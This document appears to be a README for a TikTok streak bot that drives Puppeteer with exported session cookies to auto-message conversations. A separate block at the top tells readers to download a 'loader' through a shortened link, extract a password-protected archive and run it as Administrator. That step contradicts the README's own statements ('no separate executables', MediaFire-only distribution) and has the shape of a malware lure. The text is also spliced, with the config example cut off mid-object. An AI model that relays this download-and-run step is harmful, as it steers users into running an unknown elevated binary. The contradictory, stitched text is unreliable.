<div align="center">

  
  
  

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## Features

- Login using TikTok session cookies (env `COOKIES_JSON` or local `cookies.json`)
- Automatically send messages to N conversations with configurable delays
- Static message mode or random quotes from `dummyjson.com/quotes/random`
- Automatic cron twice a day on GitHub Actions + manual `workflow_dispatch`
- Run status notifications to a Discord webhook
- Docker image for self-hosted runs

## Repository Structure

| Path | Description |
| :--- | :--- |
| `.github/` | Actions workflows, CodeQL, Dependabot |
| `config.json` | All bot behavior options (message, delays, etc.) |
| `index.js` | Puppeteer bot: launch, inject cookies, send messages |
| `package.json` | npm manifest: Puppeteer, figlet, kleur dependencies |
| `Dockerfile` | Self-hosted container image |

## Docker

```bash
docker build -t tiktok-streak .
docker run --rm \
  -e COOKIES_JSON="$(cat cookies.json)" \
  -e HEADLESS=true \
  tiktok-streak
```

Config can be overridden via environment variables: `CONFIG_JSON` (full JSON), `HEADLESS`, `TOTAL_USERS`, `MESSAGE`, `COOKIES_JSON`.

For a schedule, run the container on a cron job, e.g.:

```cron
0 9,17 * * * docker run --rm -e COOKIES_JSON='[...]' tiktok-streak
```

## Setup

### 1. Fork or clone

Fork this repo to your GitHub account, or clone locally and push to your own repo.

> **Note:** Using a public repository is safe because sensitive cookies are stored in
> GitHub Actions Secrets, not in the code.

### 2. Configure `COOKIES_JSON`

The bot authenticates using TikTok session cookies.

- **Never** put cookies directly in the source code or commit them to the repo
- Store them as a GitHub Actions Secret

#### Export cookies

Use a cookie export extension such as EditThisCookie. Expected format:

```json
[
  {
    "name": "sessionid",
    "value": "xxx",
    "domain": ".tiktok.com"
  }
]
```

#### Add the secret

1. Open your repo on GitHub
2. Go to **Settings > Secrets and variables > Actions**
3. Click **New repository secret**
4. Fill in:
   - **Name:** `COOKIES_JSON`
   - **Secret:** the exported cookies (can be minified to a single line)
5. Save

Optional: set the `DISCORD_WEBHOOK` secret for run status notifications.

> [!CAUTION]
> **Treat your TikTok cookies like a password.**
>
> Anyone who obtains valid session cookies may potentially access your TikTok
> session. Never publish them, commit them to Git, or share them with anyone.

### 3. Configure `config.json`

```json
{
  "message": "API",
  "useQuotesAPi": true,
  "totalUsers": 14,
  "actionDelayMs": 300,
  "typeDelayMs": 0,
  "afterSendDelayMs": 500,
  "afterClickDelayMs": 300,
  "pageLoadDelayMs": 5000,
  "finishDelayMs": 3000,
  "headless": false,
  "bannerFont": "DOS Rebel",
## Executables

- No separate executables; the only tool is `index.js`, run via `node` or GitHub Actions

### `index.js`

- Launches Chromium via Puppeteer, injects cookies from env or file
- Opens the messaging page, dismisses the initial modal, loops message sending
- Sends with `Ctrl+Enter`, logs success/failure per user, summary at the end

- Run normally:
  ```bash
  npm install
  node index.js
  ```

- Run with detailed per-step logs:
  ```bash
  node index.js --debug
  ```

- Run with local cookies without env:
  ```bash
  COOKIES_JSON="$(cat cookies.json)" node index.js
  ```

> **Note:** Local mode uses `cookies.json` (already gitignored) when the
> `COOKIES_JSON` env var is not set. Both accept a cookie array (normal) or a
> single cookie object which is auto-wrapped.

## Workflows

### Via GitHub Actions (recommended)

- Trigger: cron twice a day in `.github/workflows/TikTok-Streak.yml`:
  - `15:00 UTC` = 22:00 WIB
  - `17:00 UTC` = 00:00 WIB
- Manual at any time: **Actions > TikTok Streak > Run workflow**
- Discord notification is sent after every run, success or failure

### Local run

- Preferred for debugging; see Executables above
- If headless is blocked by TikTok, see Troubleshooting

## Architecture

- Single one-way flow of a bot run, from trigger to notification:

```mermaid
flowchart LR
  A[Trigger: cron or workflow_dispatch] --> B[Actions runner: windows-latest]
  B --> C[npm install dependencies]
  C --> D[node index.js: load cookies]
  D --> E[Puppeteer: launch Chromium no-sandbox]
  E --> F[Set cookies, open targetUrl]
  F --> G[messages iframe, dismiss modal]
  G --> H[Loop totalUsers: click, type, Ctrl+Enter]
  H --> I[Success/Failed summary]
  I --> J[Discord webhook: run status]
```



- `index.js` module:
  - Config: `loadConfig()` reads `config.json` or `CONFIG_JSON` env, errors on invalid
  - Credentials: env `COOKIES_JSON` first, then local `cookies.json`;
    cookie array or single object auto-wrapped
  - Navigation: viewport 1280x800, `networkidle2`, wait `pageLoadDelayMs`
  - Modal: click outside `_TUXModal-wrapper` if it appears within 3 seconds
  - Loop: selector `div[data-index="i"]` per conversation; per-user errors are
    caught individually, one failure does not stop the run
  - Message: static from `config.message` or random quote via `fetchQuote()`
- Actions workflow `.github/workflows/TikTok-Streak.yml`:
  - `runs-on: windows-latest`, Node 22 via `actions/setup-node`
  - Secret `COOKIES_JSON` injected into the run step env
  - Discord notification via `tsickert/discord-webhook`, `if: always()`

## Troubleshooting

### Cookies expired

- Re-export cookies from your browser
- Replace the `COOKIES_JSON` secret
- Re-run the workflow

### TikTok UI changed

- The selectors in `index.js` need updating
- Likely candidates: messages iframe selector, `data-e2e` conversation item,
  editor selector `public-DraftEditor-content`
- Check with `node index.js --debug` to see which step fails

### Workflow fails

- Check logs in **GitHub > Actions > TikTok Streak**
- The logs show which step failed

### Headless blocked by TikTok

- Try setting `"headless": false`
- Or increase `pageLoadDelayMs` and `actionDelayMs`

## Disclaimer

- This project is **not affiliated with, endorsed by, or sponsored by TikTok**
- The repo owner provides this project as-is without liability for its use
- You are responsible for the risks, limits, and consequences of using this bot

> **Use responsibly. You've been warned.**


---

MIT License

Copyright (c) 2026 Kurniawan Satria

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
